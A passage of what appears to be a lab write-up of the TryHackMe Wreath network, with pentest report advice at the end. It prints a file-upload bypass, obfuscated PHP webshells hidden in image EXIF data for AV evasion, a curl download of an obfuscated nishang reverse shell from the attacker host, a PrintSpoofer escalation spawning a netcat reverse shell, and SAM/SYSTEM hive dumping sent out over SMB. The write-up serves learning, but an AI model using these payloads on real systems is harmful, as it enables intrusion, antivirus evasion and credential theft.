s="========================"; for i in $(ls);do cd $i && echo $s && cat commit-meta.txt && printf "\n\n" && cd ..;done
```
{% endcode %}

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

From the metadata we can easily guess the commit order which is:

1. 70dde80cc19ec76704567996738894828f4ee895
2. 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
3. 345ac8b236064b431fa43f53d91c98c4834ef8f3

<mark style="color:orange;">The short version / conclusion is --> the most up to date version of the site stored in the Git repository is in the</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">directory</mark>

### Website Code Analysis

Head into the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/` directory.

The `index.html` file isn't promising -- realistically we need some PHP, which we identified as the webserver's back-end language earlier.

Let's look for PHP files using `find`:\
`find . -name "*.php"`

Only one result:\
`./resources/index.php`

Reading the Hint on the Question: i figured there's a "todo" list somewhere, so i used grep to search.

`grep -iRl 'todo' .` - while in the "345ac..." directory.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>the todo list.</p></figcaption></figure>

Especially the 3rd bullet is interesting. This tells us that this page might be protected by basic auth.

The rest of the code is responsible for the file upload:

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php

	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
		$target = "uploads/".basename($_FILES["file"]["name"]);
		$goodExts = ["jpg", "jpeg", "png", "gif"];
		if(file_exists($target)){
			header("location: ./?msg=Exists");
			die();
		}
		$size = getimagesize($_FILES["file"]["tmp_name"]);
		if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
			header("location: ./?msg=Fail");
			die();
		}
		move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
		header("location: ./?msg=Success");
		die();
	} else if ($_SERVER["REQUEST_METHOD"] == "post"){
		header("location: ./?msg=Method");
	}


	if(isset($_GET["msg"])){
		$msg = $_GET["msg"];
		switch ($msg) {
			case "Success":
				$res = "File uploaded successfully!";
				break;
			case "Fail":
				$res = "Invalid File Type";
				break;
			case "Exists":
				$res = "File already exists";
				break;
			case "Method":
				$res = "No file send";
				break;
		
		}
	}
?>
```
{% endcode %}

#### Code Explanation

In line 5, the allowed extensions are defined. Apparently, we are only able to upload `jpg,jpeg,png and gif` files. The crucial part of this file upload is in line 11. Here, it is checked whether the uploaded filename actually is one of the defined allowed extensions. This is done using the `explode()` function. The `explode()` function separates the string at the specified separator (in this case it’s a dot `.`). This means that e.g. the filename `test.jpg` will be converted to an array: \[“test”,”jpg”]. Next, the element at index 1 is compared to the allowed extensions. This is obviously vulnerable, as it assumes, that the uploaded file ALWAYS has EXACTLY ONE file extension. But what happens if we rename the file to `test.jpg.php`. Then, the file-name is still allowed because it has the extension `.jpg` at index 1. This way, we can upload `php` files!

So now that we know that we can exploit the file upload, let’s try to access it!

### Exploit POC

One of the Todos hinted towards an existing HTTP Basic Auth mechanism that protects the upload functionality located at `10.200.85.100/resources/index.php`. And indeed! If we try to access this website, we are prompted with a login form. However, we are in posession of Thomas’ credentials! Let’s use them and see if it works: `thomas : i<3ruby` .

<figure><img src="https://korbinian-spielvogel.de/assets/post_images/thm_wreath/wreath_ruby_image_upload.png" alt=""><figcaption><p>we are in.</p></figcaption></figure>

The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way.

We can then use `exiftool` to check the exifdata of the file:\
`exiftool -Comment="Test Payload\"; die(); ?>" test.png` - update the Comment section of the image. rename the file to "test.png.php"

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

When we upload the file, we view the file:

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Next, we can include PHP code that takes a GET parameter as input for the system() function. This way we can get a decent web shell.

{% code overflow="wrap" lineNumbers="true" %}
```bash
<?
php echo "<pre>" . system($_GET['cmd']) . "</pre>";
?>
```
{% endcode %}

Upload it again and access it while also appending the parameter `?cmd=whoami`. Huh …. we do not get any output. Let’s try other commands such as `ipconfig`…. Nothing works. Maybe the file was detected by an AV.

## AV Evasion

When it comes to AV evasion we have two primary types available:

* On-Disk evasion
* In-Memory evasion

On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (`.exe`) files.

In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.

In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should _always_ disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!

AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.

### Detection Methods

Generally speaking, detection methods can be classified into one of two categories:

* Static Detection
* Dynamic / Heuristic / Behavioural Detection

Modern Antivirus software will usually rely on a combination of these.

**Static detection** methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change _something_ when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system

The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching. Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.

static virus malware detection methods look at the file itself, dynamic methods look at how the file _acts._ There are a couple of ways to do this.

1. AV software can go through the executable line-by-line checking the flow of execution. Based on _pre-defined rules_ about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program _intends_ to act, and make decisions accordingly
2. The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware

\
That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it's doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer's available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.

### PHP Payload Obfuscation

First up, let's build that payload:

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```
{% endcode %}

Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.

This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:

1. If we're obfuscating it then it will become a one-liner anyway
2. Anything _different_ is good when it comes to AV evasion

We now need to obfuscate this payload.

There are a variety of measures we could take here, including but not limited to:

* Switching parts of the exploit around so that they're in an unusual order
* Encoding all of the strings so that they're not recognisable
* Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)

We use this site to Obfuscate our php payload --> [here](https://www.gaijin.at/en/tools/php-obfuscator)

<figure><img src=".gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

And got:

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php $i0=$_GET["wreath"];if(isset($i0)){echo "<pre>".shell_exec($i0)."</pre>";}die();?>
```
{% endcode %}

So we use "exiftool" to add comment to a .png file again.

But the problem is the dollar signs, bash is gonna treat them as variables so to get rid of that problem we will put `\` characters in front of them to skip them.

{% code overflow="wrap" lineNumbers="true" %}
```bash
exiftool -Comment="<?php \$i0=\$_GET["wreath"];if(isset(\$i0)){echo '<pre>'.shell_exec(\$i0).'</pre>';}die();?>" shell.png
```
{% endcode %}

<figure><img src=".gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

And we bypassed the AV.

### Compiling Netcat & Reverse Shell!

Our webshell is all well and good, but let's go for a full reverse shell!

Realistically we have several options here:

* Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
* We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
* We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.
* We could use [chimera](https://github.com/tokyoneon/Chimera)

I used this [tool](https://github.com/tokyoneon/Chimera) to obfuscate the nishang powershell reverse shell, it’s the full reverse shell, not the oneliner one. So the steps were :

1. Get the nishang Powershell Tcp Reverse shell from [_**here**_](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
2. Install the chimera tool as mentioned in the blog post from github.
3. Edit the nishang script and put your IP and the port where you want the reverse shell on. Specifically take this line from the examples in the script and put it in the end&#x20;

<figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

`Invoke-PowerShellTcp -Reverse -IPAddress`` ``10.50.88.51 -Port 9002` like this. I named it `inv.ps1` .

4\. Finally obfuscate the script with chimera using the following command. The obfuscated script will be at located at `/tmp/chimera.ps1`

{% code overflow="wrap" lineNumbers="true" %}
```bash
/opt/chimera/chimera.sh -f inv.ps1 -l 3 -o /tmp/inv.ps1 -v -t powershell,windows,\copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\invoke-expression,out-string,write-error -j -g -k -r -p
```
{% endcode %}

5\. Host the script with python webserver in the directory where script is.

```
root@kali -> python3 -m http.server 80
```

6\. Upload the script using the webshell and good old `curl` .

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://localhost:9020/resources/uploads/mal.png.php?wreath=curl http://10.50.88.51/inv.ps1 -o c:\\windows\\temp\\inv.ps1
```
{% endcode %}

7. start the listener `rlwrap nc -lnvp 9002` and execute the chimera script with&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://localhost:9020/resources/uploads/mal.png.php?wreath=powershell.exe -c "c:\\windows\\temp\\inv.ps1"
```
{% endcode %}

And we got the shell

<figure><img src=".gitbook/assets/image (121).png" alt=""><figcaption><p>success</p></figcaption></figure>

## Privilege Escalation

Let's start by looking for non-default services:\
`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`

We discover a "SystemExplorerHelpService" service with Unquoted Path Name.

So i will just exploit the "SeImpersonatePrivilege" using PrintSpoofer Abuse attack, or we can also use the [Juicy Potato attack](https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc?source=post\_page-----439b36e5e96a--------------------------------).

{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc?source=post_page-----439b36e5e96a--------------------------------" %}

This attack also works on the same idea of escalating privilege from Local Service/ Network Service account (We are a service account because remember our user was running the webserver ? that means the XAMPP Service for this machine.) to a Sytem Level Account but it utilizes the `Print Spooler` service and get a `System Level Token` to run a custom command with that elevated privilege with `CreateProcessAsUser()` function.

1. First get the prebuilt executable file (64 bit one) from the github release page of the PrintSpoofer tool. [https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases)
2. Host the file with python in attack machine.
3. curl the file into the windows shell that we have. And make sure to download it in one of those world writable directories to avoid AV. I did it in the `c:\windows\system32\spool\drivers\color` directory.

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl http://10.50.55.240/PrintSpoofer64.exe -o dking.exe
```
{% endcode %}

4\. Now simply launch the attack.

```
.\dking.exe -i -c whoami
```

<figure><img src=".gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

See the command has been executed as `nt authority\system` but we don’t get to keep the interactive shell. It closes by itself. So for better persistence, we can just create a netcat connection to our Attack Machine. To do that, upload 64 bit netcat binary from github and upload that to the Machine.

`.\dking.exe -c "C:\xampp\htdocs\resources\uploads\nc64.exe 10.50.88.51 1212 -e cmd"` - type in the .100 machine.

<figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption><p>and we got nt system.</p></figcaption></figure>

{% hint style="danger" %}
Mmikatz won't work here because of antivirus detection.

To dump the hashes, we need to dump 2 Hives.

1. The SAM Hive which contains all the user hashes that were cached while logging in.
2. The System Hive which contains system information and the boot key.

While the computer is on, these files are constantly getting used, so we can’t directly download these. So the trick is to make a backup of these files which will be the exact same copy and download the copies. We can use robocopy or reg.exe to do this. Then transfer them to our Attack machine and use a tool to dump hashes from them.
{% endhint %}

**Step 1** : Make copies of SAM and SYSTEM.

```powershell
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

<figure><img src="https://miro.medium.com/v2/resize:fit:336/1*3A1WxMZQZc1vXvBRelb3lQ.png" alt="" height="155" width="488"><figcaption></figcaption></figure>

**Step 2** : Transfer those bak files to attack machine. To do this, I hosted a smbserver from impacket. SMB is very windows oriented so it’s extremely easy to transfer to/from windows using SMB Server. So I created a share named `share` in the current directory. Then used `net use` to connect and `move` to actually transfer the files.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
#Attack Machine
root@kali -> impacket-smbserver share -smb2support .

#Victim Machine
PS> net use \\10.50.55.240\share
PS> move sam.bak \\10.50.55.240\share\sam.bak
PS> move system.bak \\10.50.55.240\share\system.bak
```
{% endcode %}

**Step 3 :** Now finally as we have the necessary files, let’s do the dump. To do that I will use another tool from impacket named `secretsdump` .

{% code overflow="wrap" lineNumbers="true" %}
```bash
python  impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```
{% endcode %}

<figure><img src=".gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

## Debrief and Report

Hopefully you've been taking notes and are now about to start writing a report on the topic. If you're not familiar with pentest reports, the following task may come in handy. Additionally, Offensive Security have also published an example penetration test report [here](https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf), and there is a whole community-curated repository of public reports [here](https://github.com/juliocesarfort/public-pentesting-reports) should you need more inspiration.

<details>

<summary>Contents of a Report</summary>

Penetration test reports are generally split into several sections. There is no strictly defined standard unfortunately, but the following layout should be well received:\


* First up is the _Executive Summary_. This should be essentially non-technical, providing a brief overview of the job that was contracted to (and completed by) the pentester, including a concise summary of the scope of the engagement. You should also include a very short summary of the results here, as well as a concise analysis of the overall security posture of the company. Be aware thought that, as the name suggests, this section is designed to be read by the higher-ups in a company who may not have a technical background or the time to devote to a long-winded explanation. This section is particularly important as in many cases it may be the only section that the client actually looks at. It should catch the eye, and will set the tone for the rest of the report.\

* At the end of (or immediately after) the executive summary include a _Timeline_ showing an overview of what you did and when you did it. This allows whoever is assigned to fix the vulnerabilities to check any logs from the compromised system and see what a successful attack looks like from their own privileged perspective.\

* Next we have the _Findings and Remediations_ section. This should be a more technical section. It should provide a detailed explanation of the  vulnerabilities you found _as well as your suggested fixes for these._ Additionally, you should indicate the severity of each vulnerability, and the risk to the company should the vulnerability be exploited by a bad actor -- the [CVSS calculator](https://www.first.org/cvss/calculator/3.1) will be useful for this. You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be.\

* After the findings and remediations should come the _Attack Narrative_. This _should_ be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.
* A section that is good to include but often skipped: the _Cleanup_ section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).
* Next (but not last), there should be a _Conclusion_. This just summarises the report, rounding off the results and stressing the importance of patching as required.
* Finally you should include _References_ then _Appendices_. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.

So, the sections should be:

1. Executive Summary
2. Timeline
3. Findings and Remediations
4. Attack Narrative
5. Cleanup
6. Conclusion
7. References
8. Appendices\


Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.\


There are many pentest report templates available on the Internet which can be used to provide a baseline for this. Many companies will also provide their penetration testers with a company-specific template to follow. Regardless, of whether you use a pre-built template or create your own, find a style and stick with it!

</details>



Done.

